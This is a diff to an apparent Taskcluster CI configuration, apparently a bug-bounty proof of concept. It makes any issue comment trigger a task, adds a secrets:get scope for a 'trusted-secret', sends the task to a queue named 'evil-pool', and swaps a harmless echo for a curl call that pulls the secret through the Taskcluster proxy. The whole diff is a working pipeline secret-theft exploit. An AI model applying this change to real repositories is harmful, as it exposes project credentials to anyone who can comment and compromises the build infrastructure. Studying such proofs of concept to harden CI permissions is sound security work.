@@ -5,13 +5,15 @@ policy:
   allowComments: collaborators
 autoCancelPreviousChecks: true
 tasks:
-  - $if: '(tasks_for == "github-pull-request" && event["action"] in ["opened","reopened","synchronize"]) || (tasks_for == "github-issue-comment" && event["action"] in ["created"])'
+  - $if: '(tasks_for == "github-issue-comment")'
     then:
       taskId: {$eval: as_slugid("test")}
       taskGroupId: {$eval: as_slugid("test")}
       created: {$fromNow: ''}
       deadline: {$fromNow: '1 day'}
-      taskQueueId: docker-compose/generic-worker
+      scopes:
+        - secrets:get:project/poc/trusted-secret
+      taskQueueId: h1-pocc/evil-pool
       metadata:
         name: plswork
         description: plswork
@@ -19,8 +21,9 @@ tasks:
         source: ${event.repository.html_url}
       payload:
         maxRunTime: 3600
-        image: node
         command:
-          - /bin/bash
-          - -c
-          - echo "Hello, World!"
+         - - /bin/bash
+           - -c
+           - curl http://taskcluster/api/secrets/v1/secret/project%2Fpoc%2Ftrusted-secret
+        features:
+          taskclusterProxy: true
